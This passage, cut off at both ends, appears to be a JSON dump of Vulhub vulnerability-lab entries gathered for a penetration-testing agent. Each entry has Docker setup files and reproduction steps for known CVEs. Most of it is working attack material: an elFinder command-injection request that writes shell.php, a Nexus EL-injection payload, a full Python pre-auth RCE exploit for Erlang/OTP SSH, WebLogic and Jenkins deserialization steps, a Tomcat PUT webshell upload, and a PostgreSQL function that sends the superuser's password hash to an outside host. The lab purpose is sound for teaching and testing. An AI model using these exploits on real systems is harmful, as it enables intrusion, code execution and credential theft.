`2.zip`:\n\n![](2.png)\n\n`1.txt` and `2.zip` are ready here:\n\n![](3.png)\n\nThen, send the following request to execute arbitrary commands:\n\n```\nGET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1\nHost: your-ip\nAccept: application/json, text/javascript, */*; q=0.01\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\nX-Requested-With: XMLHttpRequest\nReferer: http://localhost.lan:8080/\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\nConnection: close\n\n\n```\n\nIn this request, you can see 3 important parameters:\n\n- `name`, its value is equal to `-TvTT=id>shell.php # a.zip`, you can modify the `id>shell.php` to arbitrary commands\n- `targets[0]`, its value is equal to `l1_MS50eHQ`. `l1` means the first storage volume, `MS50eHQ` is the base64 encoded string of `1.txt`\n- `targets[1]`, its value is equal to `l1_Mi56aXA`. `l1` means the first storage volume, `Mi56aXA` is the base64 encoded string of `2.zip`\n\nAlthough this request responeds to an error message, our command has been executed and `shell.php` has been written to `http://your-ip:8080/files/shell.php`:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2017-15715.md",
    "filenamenomd": "CVE-2017-15715",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/Dockerfile\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 69 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n apache:\n   build: .\n   ports:\n    - \"8080:80\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 153 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/php:5.5-apache\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nCOPY index.php /var/www/html/\n\nRUN chown www-data:www-data -R /var/www/html\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2017-15715/index.php\n\n- Extension: .php\n- Language: php\n- Size: 636 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nif(isset($_FILES['file'])) {\n    $name = basename($_POST['name']);\n    $ext = pathinfo($name,PATHINFO_EXTENSION);\n    if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {\n        exit('bad file');\n    }\n    move_uploaded_file($_FILES['file']['tmp_name'], './' . $name);\n} else {\n\n?>\n\n<!DOCTYPE html>\n<html>\n<head>\n\t<title>Upload</title>\n</head>\n<body>\n<form method=\"POST\" enctype=\"multipart/form-data\">\n\t<p>\n\t\t<label>file:<input type=\"file\" name=\"file\"></label>\n\t</p>\n\t<p>\n\t\t<label>filename:<input type=\"text\" name=\"name\" value=\"evil.php\"></label>\n\t</p>\n\t<input type=\"submit\">\n</form>\n</body>\n</html>\n\n<?php\n}\n?>\n\n```\n\n",
    "readme": "# Apache HTTPD Newline Parsing Vulnerability (CVE-2017-15715)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache HTTPD is a widely-used HTTP server that can run PHP web pages through mod_php. A parsing vulnerability exists in versions 2.4.0 through 2.4.29, where a filename ending with `1.php\\x0A` will be treated as a PHP file, allowing attackers to bypass certain server security policies.\n\nReferences:\n\n- <https://httpd.apache.org/security/vulnerabilities_24.html>\n- <https://security.elarlang.eu/cve-2017-15715-apache-http-server-filesmatch-bypass-with-a-trailing-newline-at-the-end-of-the-file-name.html>\n\n## Environment Setup\n\nExecute the following commands to build and start a vulnerable Apache HTTPD server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, Apache will be running at `http://your-ip:8080`.\n\n## Vulnerability Reproduction\n\nFirst, try to upload a file named `1.php`. The upload will be blocked by the security check:\n\n![Upload blocked by security check](1.png)\n\nHowever, if we append a `\\x0A` (note: must be `\\x0A` alone, not `\\x0D\\x0A`) to the filename `1.php`, the upload will succeed:\n\n![Successful upload with newline character](2.png)\n\nWhen accessing the uploaded file at `/1.php%0a`, it will be successfully parsed as a PHP file, despite not having a proper PHP extension. This confirms the existence of the parsing vulnerability:\n\n![Successful PHP execution](3.png)\n"
  },
  {
    "filename": "CVE-2020-10199.md",
    "filenamenomd": "CVE-2020-10199",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10199/admin.password\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10199/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10199/admin.password\n\n- Extension: .password\n- Language: unknown\n- Size: 5 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nadmin\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2020-10199/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 150 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/nexus:3.21.1\n   ports:\n    - \"8081:8081\"\n   volumes: \n    - ./admin.password:/nexus-data/admin.password\n\n```\n\n",
    "readme": "# Nexus Repository Manager 3 Authenticated Remote Code Execution (CVE-2020-10199)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.\n\nIn the version <= 3.21.1, a EL injection vulnerability has been discovered that allows for an attacker with any type of account on Nexus Repository to execute arbitrary code by crafting a malicious request to Nexus Repository.\n\nReferences:\n\n- https://support.sonatype.com/hc/en-us/articles/360044882533-CVE-2020-10199-Nexus-Repository-Manager-3-Remote-Code-Execution-2020-03-31\n- https://github.com/threedr3am/learnjavabug/blob/93d57c4283/nexus/CVE-2020-10199/README.md\n- https://github.com/jas502n/CVE-2020-10199\n\n## Vulnerable environment\n\nExecute following command to start a Nexus Repository Manager version 3.21.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8081` to see the home page of Nexus. Login the admin panel with account `admin:admin` and finish the initialize wizard.\n\n## Exploit\n\nCopy your cookie and CSRF token then send following request:\n\n```\nPOST /service/rest/beta/repositories/go/group HTTP/1.1\nHost: 127.0.0.1:8081\nContent-Length: 203\nX-Requested-With: XMLHttpRequest\nX-Nexus-UI: true\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36\nNX-ANTI-CSRF-TOKEN: [csrf-token]\nContent-Type: application/json\nAccept: */*\nOrigin: http://127.0.0.1:8081\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nReferer: http://127.0.0.1:8081/\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: NX-ANTI-CSRF-TOKEN=[csrf-token]; NXSESSIONID=[session-id]\nConnection: close\n\n{\n  \"name\": \"internal\",\n  \"online\": true,\n  \"storage\": {\n    \"blobStoreName\": \"default\",\n    \"strictContentTypeValidation\": true\n  },\n  \"group\": {\n    \"memberNames\": [\"$\\\\A{233*233*233}\"]\n  }\n}\n```\n\n![](1.png)\n\nRefer to <https://github.com/jas502n/CVE-2020-10199>, use EL expression payload `$\\\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('touch /tmp/success')}` to execute command `touch /tmp/success`.\n"
  },
  {
    "filename": "CVE-2025-32433.md",
    "filenamenomd": "CVE-2025-32433",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/erlang/CVE-2025-32433/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/erlang/CVE-2025-32433/exploit.py\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/erlang/CVE-2025-32433/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 105 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  sshd:\n    image: vulhub/erlang:27.3.2-with-ssh\n    ports:\n      - \"2222:2222\"\n    init: true\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/erlang/CVE-2025-32433/exploit.py\n\n- Extension: .py\n- Language: python\n- Size: 5202 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport socket\nimport struct\nimport time\nimport argparse\nimport base64\n\n\n# Helper to format SSH string (4-byte length + bytes)\ndef string_payload(s):\n    s_bytes = s.encode(\"utf-8\")\n    return struct.pack(\">I\", len(s_bytes)) + s_bytes\n\n\n# Builds SSH_MSG_CHANNEL_OPEN for session\ndef build_channel_open(channel_id=0):\n    return (\n        b\"\\x5a\"  # SSH_MSG_CHANNEL_OPEN\n        + string_payload(\"session\")\n        + struct.pack(\">I\", channel_id)  # sender channel ID\n        + struct.pack(\">I\", 0x68000)  # initial window size\n        + struct.pack(\">I\", 0x10000)  # max packet size\n    )\n\n\n# Builds SSH_MSG_CHANNEL_REQUEST with 'exec' payload\ndef build_channel_request(channel_id=0, command=None):\n    return (\n        b\"\\x62\"  # SSH_MSG_CHANNEL_REQUEST\n        + struct.pack(\">I\", channel_id)\n        + string_payload(\"exec\")\n        + b\"\\x01\"  # want_reply = true\n        + string_payload(command)\n    )\n\n\n# Builds a minimal but valid SSH_MSG_KEXINIT packet\ndef build_kexinit():\n    cookie = b\"\\x00\" * 16\n\n    def name_list(l):\n        return string_payload(\",\".join(l))\n\n    # Match server-supported algorithms from the log\n    return (\n        b\"\\x14\"\n        + cookie\n        + name_list(\n            [\n                \"curve25519-sha256\",\n                \"ecdh-sha2-nistp256\",\n                \"diffie-hellman-group-exchange-sha256\",\n                \"diffie-hellman-group14-sha256\",\n            ]\n        )  # kex algorithms\n        + name_list([\"rsa-sha2-256\", \"rsa-sha2-512\"])  # host key algorithms\n        + name_list([\"aes128-ctr\"]) * 2  # encryption client->server, server->client\n        + name_list([\"hmac-sha1\"]) * 2  # MAC algorithms\n        + name_list([\"none\"]) * 2  # compression\n        + name_list([]) * 2  # languages\n        + b\"\\x00\"\n        + struct.pack(\">I\", 0)  # first_kex_packet_follows, reserved\n    )\n\n\n# Pads a packet to match SSH framing\ndef pad_packet(payload, block_size=8):\n    min_padding = 4\n    padding_len = block_size - ((len(payload) + 5) % block_size)\n    if padding_len < min_padding:\n        padding_len += block_size\n    return (\n        struct.pack(\">I\", len(payload) + 1 + padding_len)\n        + bytes([padding_len])\n        + payload\n        + bytes([0] * padding_len)\n    )\n\n\n# Convert system command to Erlang os:cmd format\ndef format_erlang_command(cmd):\n    # Use base64 encoding to avoid escaping issues\n    encoded_cmd = base64.b64encode(cmd.encode()).decode()\n    # Create Erlang code that decodes and executes the command\n    return f'os:cmd(binary_to_list(base64:decode(\"{encoded_cmd}\"))).'\n\n\n# === Exploit flow ===\ndef main():\n    # Parse command line arguments\n    parser = argparse.ArgumentParser(description='Exploit for Erlang CVE-2025-32433')\n    parser.add_argument('-t', '--target', default=\"127.0.0.1\", help='Target IP address (default: 127.0.0.1)')\n    parser.add_argument('-p', '--port', type=int, default=2222, help='Target port (default: 2222)')\n    parser.add_argument('-c', '--command', help='System command to execute (for example: touch /tmp/success)')\n    parser.add_argument('-e', '--erlang', help='Interpret command as raw Erlang code instead of system command. (for example: os:cmd(\"touch /tmp/success\").)')\n    args = parser.parse_args()\n\n    # Convert system command to Erlang command unless --erlang flag is used\n    if args.erlang:\n        erlang_cmd = args.erlang\n    elif args.command:\n        erlang_cmd = format_erlang_command(args.command)\n    else:\n        print(parser.print_help())\n        return\n\n    try:\n        with socket.create_connection((args.target, args.port), timeout=5) as s:\n            print(\"[*] Connecting to SSH server...\")\n\n            # 1. Banner exchange\n            s.sendall(b\"SSH-2.0-OpenSSH_8.9\\r\\n\")\n            banner = s.recv(1024)\n            print(f\"[+] Received banner: {banner.strip().decode(errors='ignore')}\")\n            time.sleep(0.5)  # Small delay between packets\n\n            # 2. Send SSH_MSG_KEXINIT\n            print(\"[*] Sending SSH_MSG_KEXINIT...\")\n            kex_packet = build_kexinit()\n            s.sendall(pad_packet(kex_packet))\n            time.sleep(0.5)  # Small delay between packets\n\n            # 3. Send SSH_MSG_CHANNEL_OPEN\n            print(\"[*] Sending SSH_MSG_CHANNEL_OPEN...\")\n            chan_open = build_channel_open()\n            s.sendall(pad_packet(chan_open))\n            time.sleep(0.5)  # Small delay between packets\n\n            # 4. Send SSH_MSG_CHANNEL_REQUEST (pre-auth!)\n            print(\"[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...\")\n            print(f\"[*] Erlang payload: {erlang_cmd}\")\n            chan_req = build_channel_request(command=erlang_cmd)\n            s.sendall(pad_packet(chan_req))\n\n            print(\n                f\"[✓] Exploit sent! Command executed on target\"\n            )\n\n            # Try to receive any response (might get a protocol error or disconnect)\n            try:\n                response = s.recv(1024)\n                print(f\"[+] Received response: {response.hex()}\")\n            except socket.timeout:\n                print(\"[*] No response within timeout period (which is expected)\")\n\n    except Exception as e:\n        print(f\"[!] Error: {e}\")\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n",
    "readme": "# Unauthenticated Remote Code Execution in Erlang/OTP SSH (CVE-2025-32433)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nErlang/OTP SSH is the built-in SSH server component of the Erlang/OTP platform.\n\nA critical vulnerability was discovered in the Erlang/OTP SSH server, allowing attackers to execute arbitrary system commands remotely without authentication by crafting specific SSH protocol messages. Affected versions include OTP-27.3.2 and earlier, OTP-26.2.5.10 and earlier, and OTP-25.3.2.19 and earlier.\n\n- <https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2>\n- <https://github.com/erlang/otp/commit/6eef04130afc8b0ccb63c9a0d8650209cf54892f#diff-ceeb1aeeb602e1424c13d9da9383e0782f65869d6e64e015c194145b1a64edcd>\n- <https://github.com/ProDefense/CVE-2025-32433>\n- <https://datatracker.ietf.org/doc/html/rfc4254>\n\n## Environment Setup\n\nRun the following command to start an Erlang/OTP 27.3.2 based SSH server:\n\n```\ndocker compose up -d\n```\n\nAfter startup, the container runs an Erlang SSH service listening on port 2222, which is mapped to the host's port 2222. You can access it using SSH tools or the provided exploit script.\n\n## Vulnerability Reproduction\n\nUse the provided [exploit.py](exploit.py) script to reproduce the vulnerability. For example, the following command will create a file inside the target container:\n\n```\npython exploit.py -t 127.0.0.1 -p 2222 -c \"touch /tmp/success\"\n```\n\n![](1.png)\n\nThe script sends a specially crafted SSH_MSG_CHANNEL_REQUEST (message number 94) packet, exploiting a flaw in the server's message handling to execute arbitrary commands during the unauthenticated phase. According to RFC 4254, the message structure is as follows:\n\n```\nbyte      SSH_MSG_CHANNEL_REQUEST\nuint32    recipient channel\nstring    \"exec\"\nboolean   want reply\nstring    command\n```\n\nAfter successful exploitation, you can enter the container and see that the `/tmp/success` file has been created.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-2628.md",
    "filenamenomd": "CVE-2018-2628",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2018-2628/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2018-2628/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n weblogic:\n   image: vulhub/weblogic:10.3.6.0-2017\n   ports:\n    - \"7001:7001\"\n\n```\n\n",
    "readme": "# Weblogic WLS Core Components Deserialization Remote Command Execution (CVE-2018-2628)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOracle Weblogic Server is a popular enterprise application server that provides a wide range of features for building and deploying enterprise applications.\n\nIn Oracle's April 2018 patch, a deserialization vulnerability in Weblogic Server WLS Core Components was fixed (CVE-2018-2628). This vulnerability can be triggered through the T3 protocol, allowing unauthorized users to execute arbitrary commands on the remote server.\n\nReference links:\n\n- http://www.oracle.com/technetwork/security-advisory/cpuapr2018-3678067.html\n- http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA\n- https://github.com/tdy218/ysoserial-cve-2018-2628\n\n## Environment Setup\n\nExecute the following command to start Weblogic 10.3.6.0:\n\n```\ndocker compose up -d\n```\n\nWait for the environment to start (depending on your machine, it might take a while), then visit `http://your-ip:7001/console` to initialize the environment.\n\n## Vulnerability Reproduce\n\nFirst, download ysoserial and start a JRMP Server:\n\n```\njava -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]\n```\n\nWhere `[command]` is the command you want to execute, and `[listen port]` is the port that the JRMP Server listens on.\n\nThen, use the [exploit.py](https://www.exploit-db.com/exploits/44553) script to send a packet to the target Weblogic (`http://your-ip:7001`):\n\n```\npython exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]\n```\n\nWhere `[victim ip]` and `[victim port]` are the IP and port of the target weblogic, `[path to ysoserial]` is the local path to ysoserial, `[JRMPListener ip]` and `[JRMPListener port]` are the IP address and port of the JRMP Server started in step 1. `[JRMPClient]` is the class to execute JRMPClient, the optional values are `JRMPClient` or `JRMPClient2`.\n\nAfter exploit.py is executed, run `docker compose exec weblogic bash` to enter the container, and you can see that /tmp/success has been successfully created.\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2022-22978.md",
    "filenamenomd": "CVE-2022-22978",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22978/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22978/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 95 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring-security:\n   image: vulhub/spring-security:5.6.3\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "# Spring Security Authorization Bypass in RegexRequestMatcher (CVE-2022-22978)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe Spring Security framework is used to provide security authentication functionality in the Spring framework. In Spring Security versions 5.5.6 and 5.6.3 and older unsupported versions, applications using RegexRequestMatcher with `.` in the regular expression are possibly vulnerable to an authorization bypass.\n\nReferences:\n\n- <https://tanzu.vmware.com/security/cve-2022-22978>\n- <https://github.com/DeEpinGh0st/CVE-2022-22978>\n\n## Vulnerability Environment\n\nExecute the following command to start a Web application based on Spring Security 5.6.3:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, browse to <http://your-ip:8080/admin> to see that access to the admin page is blocked.\n\n![](forbidden.png)\n\n## Vulnerability Reproduce\n\nSend the following request to access the admin page that bypassed the authentication:\n\n- <http://your-ip:8080/admin/%0atest>\n- <http://your-ip:8080/admin/%0dtest>\n\n![](bypassed.png)\n"
  },
  {
    "filename": "CVE-2018-1058.md",
    "filenamenomd": "CVE-2018-1058",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2018-1058/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2018-1058/init.sh\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2018-1058/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 212 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n postgres:\n   image: vulhub/postgres:9.6.7\n   ports:\n    - \"5432:5432\"\n   environment:\n    - POSTGRES_PASSWORD=vulhub_secret\n   volumes:\n    - ./init.sh:/docker-entrypoint-initdb.d/init.sh\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/postgres/CVE-2018-1058/init.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 361 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\n\nset -ex \n\npsql -v ON_ERROR_STOP=1 --username \"$POSTGRES_USER\" <<-EOSQL\n    CREATE USER \"vulhub\" WITH PASSWORD 'vulhub';\n    CREATE DATABASE \"vulhub\" OWNER \"vulhub\";\n    GRANT ALL PRIVILEGES ON DATABASE \"vulhub\" to \"vulhub\";\nEOSQL\n\npsql -v ON_ERROR_STOP=1  --username \"$POSTGRES_USER\" vulhub <<-EOSQL\n    CREATE EXTENSION IF NOT EXISTS dblink;\nEOSQL\n```\n\n",
    "readme": "# PostgreSQL Privilege Escalation (CVE-2018-1058)\n\n[中文文档](README.zh-cn.md)\n\nPostgreSQL is a powerful open-source relational database system. A logical error exists in versions 9.3 through 10, where superusers can unknowingly execute malicious code created by regular users, leading to unexpected operations.\n\nReferences:\n\n- https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path\n- https://xianzhi.aliyun.com/forum/topic/2109\n\n## Environment Setup\n\nExecute the following command to start a vulnerable PostgreSQL server:\n\n```\ndocker compose up -d\n```\n\nThe server will start and listen on the default PostgreSQL port 5432.\n\n## Vulnerability Reproduction\n\nFollowing the second exploitation method from the references, we'll first connect to PostgreSQL as the regular user `vulhub:vulhub`:\n\n```bash\npsql --host your-ip --username vulhub\n```\n\n![](1.png)\n\nExecute the following SQL statements and then exit:\n\n```sql\nCREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$\n    select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); \n    SELECT pg_catalog.array_to_string($1,$2);\n$$ LANGUAGE SQL VOLATILE;\n```\n\nNow, set up a listener on port 5433 at `10.0.0.1` to wait for the superuser to trigger our \"backdoor\".\n\n(Simulating superuser actions) On the target machine, execute the `pg_dump` command as the superuser:\n\n```bash\ndocker compose exec postgres pg_dump -U postgres -f evil.bak vulhub\n```\n\nThis command will export the contents of the `vulhub` database. When executed, our \"backdoor\" is triggered, and sensitive information is received on the `10.0.0.1` machine:\n\n![](2.png)\n\nThis is just one of several exploitation methods for this vulnerability. For more exploitation techniques, please refer to the articles in the References section.\n"
  },
  {
    "filename": "CVE-2017-1000353.md",
    "filenamenomd": "CVE-2017-1000353",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2017-1000353/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jenkins/CVE-2017-1000353/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 121 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  jenkins:\n    image: vulhub/jenkins:2.46.1\n    init: true\n    ports:\n      - \"50000:50000\"\n      - \"8080:8080\"\n```\n\n",
    "readme": "# Jenkins Remote Code Execution (CVE-2017-1000353)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nJenkins is a popular open-source automation server.\n\nJenkins versions 2.56 and earlier as well as 2.46.1 LTS and earlier are vulnerable to an unauthenticated remote code execution. An unauthenticated remote code execution vulnerability allowed attackers to transfer a serialized Java `SignedObject` object to the Jenkins CLI, that would be deserialized using a new `ObjectInputStream`, bypassing the existing blacklist-based protection mechanism.\n\nReferences:\n\n- <https://www.jenkins.io/security/advisory/2017-04-26/>\n- <https://www.exploit-db.com/exploits/41965>\n\n## Environment Setup\n\nExecute the following command to start Jenkins 2.46.1:\n\n```\ndocker compose up -d\n```\n\nAfter the server is fully started, visit `http://your-ip:8080` to access Jenkins. No manual installation is required.\n\n## Vulnerability Reproduction\n\nThe exploitation process involves two steps: generating a malicious serialized payload and sending it to the target Jenkins server.\n\nFirst, download the [CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar) tool to generate the payload. This tool will create a serialized object containing our command:\n\n```bash\njava -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touch /tmp/success\"\n# jenkins_poc.ser is the output file name\n# \"touch ...\" is the command to be executed\n```\n\nAfter execution, a file named `jenkins_poc.ser` will be generated containing the serialized payload.\n\nNext, download the [exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py) script and execute it with Python 3 to send the payload:\n\n```bash\npython exploit.py http://your-ip:8080 jenkins_poc.ser\n```\n\n![Sending the exploit payload](1.png)\n\nTo verify the successful exploitation, check inside the container for the created file:\n\n![Verification of command execution](2.png)\n\nThe presence of `/tmp/success` file confirms that the remote code execution was successful.\n"
  },
  {
    "filename": "CVE-2017-12615.md",
    "filenamenomd": "CVE-2017-12615",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2017-12615/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2017-12615/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2017-12615/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 71 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n tomcat:\n   build: .\n   ports:\n    - \"8080:8080\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/tomcat/CVE-2017-12615/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 335 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/tomcat:8.5.19\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN cd /usr/local/tomcat/conf \\\n    && LINE=$(nl -ba web.xml | grep '<load-on-startup>1' | awk '{print $1}') \\\n    && ADDON=\"<init-param><param-name>readonly</param-name><param-value>false</param-value></init-param>\" \\\n    && sed -i \"$LINE i $ADDON\" web.xml \n```\n\n",
    "readme": "# Tomcat Arbitrary Write-file Vulnerability through PUT Method (CVE-2017-12615)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nTomcat version: 8.5.19\n\n## Environment Setup\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter successfully running the commands above, you will see the example page of Tomcat through visiting the site `http://your-ip:8080`.\n\n## Rationale\n\nReference links:\n\n- http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html\n- https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5\n- https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e\n\nTomcat sets up the write permission（readonly=false）, which leads to the result that we can write files into the server.\n\n```\n<servlet>\n    <servlet-name>default</servlet-name>\n    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>\n    <init-param>\n        <param-name>debug</param-name>\n        <param-value>0</param-value>\n    </init-param>\n    <init-param>\n        <param-name>listings</param-name>\n        <param-value>false</param-value>\n    </init-param>\n    <init-param>\n        <param-name>readonly</param-name>\n        <param-value>false</param-value>\n    </init-param>\n    <load-on-startup>1</load-on-startup>\n</servlet>\n```\n\nAlthough Tomcat checks the file suffix to some extent(can't write jsp directly), we can still bypass the limitation through some file system features(such as using `/` in Linux).\n\n## POC\n\nSend the following packets directly and then the shell will be written into the Web root directory.\n\n```\nPUT /1.jsp/ HTTP/1.1\nHost: your-ip:8080\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 5\n\nshell\n```\n\nAs follows:\n\n![](01.png)\n"
  },
  {
    "filename": "CVE-2018-1270.md",
    "filenamenomd": "CVE-2018-1270",
